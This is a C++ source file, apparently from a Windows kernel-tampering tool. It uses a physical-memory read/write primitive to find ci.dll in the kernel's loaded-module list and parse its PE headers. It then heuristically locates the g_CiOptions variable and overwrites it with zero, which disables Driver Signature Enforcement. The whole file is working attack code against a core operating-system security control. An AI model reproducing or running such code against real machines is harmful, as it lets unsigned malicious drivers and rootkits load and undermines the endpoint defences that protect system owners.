#include <windows.h>
#include <stdio.h>
#include <vector>
#include "symbols.h"
#include "window.h"
#include "dse.h"

static ULONG64 ReadKernelPtr(ULONG64 cr3, ULONG64 va) {
    ULONG64 pa = WindowVirtToPhys(cr3, va);
    return pa ? WindowRead64(pa) : 0;
}

// Read kernel virtual memory page-by-page (physical pages are not contiguous).
static bool ReadKernelBytes(ULONG64 cr3, ULONG64 va, void* buffer, ULONG size) {
    BYTE* out = (BYTE*)buffer;
    while (size) {
        ULONG pageOff = (ULONG)(va & 0xFFF);
        ULONG chunk = 0x1000 - pageOff;
        if (chunk > size) chunk = size;

        ULONG64 pa = WindowVirtToPhys(cr3, va);
        if (!pa) return false;
        WindowReadBuffer(pa, out, chunk);

        out += chunk;
        va += chunk;
        size -= chunk;
    }
    return true;
}

// Walk PsLoadedModuleList and return the loaded image base/size of a module.
static bool FindKernelModule(
    ULONG64 systemCr3, KernelOffsets* offsets,
    const wchar_t* moduleName, ULONG64* imageBase, ULONG* imageSize
) {
    ULONG64 listHead = offsets->NtoskrnlBase + offsets->PsLoadedModuleList;
    ULONG64 link = ReadKernelPtr(systemCr3, listHead);
    if (!link) return false;

    int count = 0;
    while (link != listHead && link != 0 && count++ < 512) {
        ULONG64 entryVA = link - offsets->LdrInLoadOrderLinks;

        // BaseDllName is a UNICODE_STRING: Length, MaximumLength, Buffer(+8)
        ULONG64 nameStringVA = entryVA + offsets->LdrBaseDllName;
        ULONG64 nameStringPA = WindowVirtToPhys(systemCr3, nameStringVA);
        if (nameStringPA) {
            USHORT nameLen = (USHORT)WindowRead32(nameStringPA);
            ULONG64 nameBufVA = WindowRead64(nameStringPA + 8);

            if (nameBufVA && nameLen > 0 && nameLen <= 260) {
                wchar_t name[130] = {};
                ULONG readLen = nameLen < sizeof(name) - 2
                    ? nameLen : (ULONG)(sizeof(name) - 2);
                ULONG64 nameBufPA = WindowVirtToPhys(systemCr3, nameBufVA);
                if (nameBufPA) {
                    WindowReadBuffer(nameBufPA, name, readLen);
                    name[readLen / sizeof(wchar_t)] = 0;

                    if (_wcsicmp(name, moduleName) == 0) {
                        ULONG64 basePA = WindowVirtToPhys(systemCr3, entryVA + offsets->LdrDllBase);
                        ULONG64 sizePA = WindowVirtToPhys(systemCr3, entryVA + offsets->LdrSizeOfImage);
                        if (basePA && sizePA) {
                            *imageBase = WindowRead64(basePA);
                            *imageSize = WindowRead32(sizePA);
                            return *imageBase != 0;
                        }
                    }
                }
            }
        }

        link = ReadKernelPtr(systemCr3, link);
    }
    return false;
}

struct PeSection {
    ULONG64 va;
    ULONG vsize;
    bool writable;
};

static bool ReadPeSections(ULONG64 cr3, ULONG64 base, ULONG* imageSize,
                           std::vector<PeSection>& sections) {
    BYTE hdr[0x1000] = {};
    if (!ReadKernelBytes(cr3, base, hdr, sizeof(hdr))) return false;

    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hdr;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
    if ((ULONG)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > sizeof(hdr)) return false;

    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(hdr + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return false;

    *imageSize = nt->OptionalHeader.SizeOfImage;

    IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (UINT i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if ((BYTE*)(sec + 1) > hdr + sizeof(hdr)) break;
        PeSection s = {};
        s.va = sec->VirtualAddress;
        s.vsize = sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
        s.writable = (sec->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
        sections.push_back(s);
    }
    return !sections.empty();
}

static bool IsWritableRva(const std::vector<PeSection>& sections, ULONG64 rva) {
    for (const auto& s : sections)
        if (rva >= s.va && rva < s.va + s.vsize && s.writable) return true;
    return false;
}

// Collect target RVAs of RIP-relative memory operands in a code buffer.
static void CollectRipRefs(const BYTE* code, ULONG size, ULONG64 funcRva,
                           std::vector<ULONG64>& out) {
    for (ULONG i = 0; i + 6 <= size; i++) {
        ULONG p = i;
        if (code[p] >= 0x40 && code[p] <= 0x4F) {
            p++;
            if (p + 6 > size) break;
        }

        ULONG immSize;
        switch (code[p]) {
            case 0x8B: case 0x89: case 0x8D:
            case 0x39: case 0x3B: case 0x85:
                immSize = 0; break;
            case 0xC7: case 0xF7: case 0x81:
                immSize = 4; break;
            case 0xF6: case 0x83:
                immSize = 1; break;
            default:
                continue;
        }

        ULONG modrmPos = p + 1;
        if (modrmPos + 5 > size) break;
        if ((code[modrmPos] & 0xC7) != 0x05) continue; // mod=00, rm=101 => RIP-relative

        LONG disp = *(LONG*)(code + modrmPos + 1);
        ULONG64 endRva = funcRva + modrmPos + 5 + immSize;
        out.push_back(endRva + (ULONG64)(LONG64)disp);

        i = modrmPos + 4 + immSize;
    }
}

// Locate g_CiOptions. The symbol is not in the public PDB, so resolve the
// exported CI validation functions and find the writable global they share.
static bool FindCiOptionsRva(ULONG64 cr3, ULONG64 ciBase, ULONG* outImageSize,
                             ULONG64* outRva) {
    std::vector<PeSection> sections;
    ULONG imageSize = 0;
    if (!ReadPeSections(cr3, ciBase, &imageSize, sections)) {
        printf("[-] Failed to read ci.dll PE headers\n");
        return false;
    }
    *outImageSize = imageSize;

    const char* funcs[] = { "CiValidateImageHeader", "CiValidateImageData" };
    std::vector<std::vector<ULONG64>> sets;

    for (const char* fn : funcs) {
        ULONG64 funcRva = 0;
        if (!ResolveSymbolRva("C:\\Windows\\System32\\ci.dll", fn, &funcRva))
            continue;

        BYTE code[0x300] = {};
        if (!ReadKernelBytes(cr3, ciBase + funcRva, code, sizeof(code)))
            continue;

        std::vector<ULONG64> refs;
        CollectRipRefs(code, sizeof(code), funcRva, refs);

        std::vector<ULONG64> filtered;
        for (ULONG64 r : refs)
            if (r < imageSize && IsWritableRva(sections, r))
                filtered.push_back(r);

        if (!filtered.empty()) {
            printf("[*] %s: %zu writable data reference(s)\n", fn, filtered.size());
            sets.push_back(filtered);
        }
    }

    if (sets.empty()) {
        printf("[-] No CI validation references found\n");
        return false;
    }

    std::vector<ULONG64> candidates = sets[0];
    if (sets.size() >= 2) {
        std::vector<ULONG64> common;
        for (ULONG64 r : sets[0])
            for (ULONG64 s : sets[1])
                if (r == s) { common.push_back(r); break; }
        if (!common.empty()) candidates = common;
        else {
            printf("[-] CI functions disagree on g_CiOptions; refusing to patch\n");
            return false;
        }
    }

    if (candidates.size() != 1) {
        printf("[-] Ambiguous g_CiOptions (%zu candidates); refusing to patch\n",
               candidates.size());
        for (ULONG64 r : candidates) printf("      candidate RVA 0x%llX\n", r);
        return false;
    }

    *outRva = candidates[0];
    return true;
}

bool DisableDSE(ULONG64 systemCr3, KernelOffsets* offsets) {
    printf("\n[*] Disabling DSE (g_CiOptions)...\n");

    ULONG64 ciBase = 0;
    ULONG ciSize = 0;
    if (!FindKernelModule(systemCr3, offsets, L"ci.dll", &ciBase, &ciSize)) {
        printf("[-] ci.dll not found in PsLoadedModuleList\n");
        return false;
    }
    printf("[+] ci.dll: 0x%llX (%u KB)\n", ciBase, ciSize / 1024);

    // Some builds expose the symbol directly; try that first.
    ULONG64 rva = 0;
    if (!ResolveSymbolRva("C:\\Windows\\System32\\ci.dll", "g_CiOptions", &rva)) {
        if (!FindCiOptionsRva(systemCr3, ciBase, &ciSize, &rva)) {
            printf("[-] Could not locate g_CiOptions\n");
            return false;
        }
    }
    printf("[+] g_CiOptions RVA: 0x%llX\n", rva);

    ULONG64 pa = WindowVirtToPhys(systemCr3, ciBase + rva);
    if (!pa) {
        printf("[-] Failed to translate g_CiOptions (VA 0x%llX)\n", ciBase + rva);
        return false;
    }

    ULONG before = WindowRead32(pa);
    printf("[*] g_CiOptions = 0x%08X\n", before);
    if (before == 0)
        printf("[!] Already 0 - DSE was not enforcing, this step has nothing to do\n");

    ULONG zero = 0;
    WindowWriteBuffer(pa, &zero, sizeof(zero));

    ULONG after = WindowRead32(pa);
    if (after == 0) {
        if (before == 0) printf("[+] g_CiOptions still 0 (unchanged)\n");
        else printf("[+] DSE disabled (0x%08X -> 0)\n", before);
        return true;
    }

    printf("[-] Write did not stick (0x%08X) - KDP/HVCI may protect it\n", after);
    return false;
}
